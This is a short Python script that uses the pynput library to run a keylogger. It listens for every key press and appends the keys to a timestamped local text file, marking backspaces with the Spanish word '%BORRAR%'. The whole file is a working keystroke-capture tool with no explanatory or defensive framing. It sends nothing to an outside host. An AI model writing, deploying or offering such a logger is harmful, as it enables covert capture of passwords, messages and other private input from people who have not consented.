import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

def key_recorder(key):
    f = open('keylogger_{}.txt'.format(d), 'a')

    key=str(key)

    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'", ""))

with Listener(on_press=key_recorder) as l:
    l.join()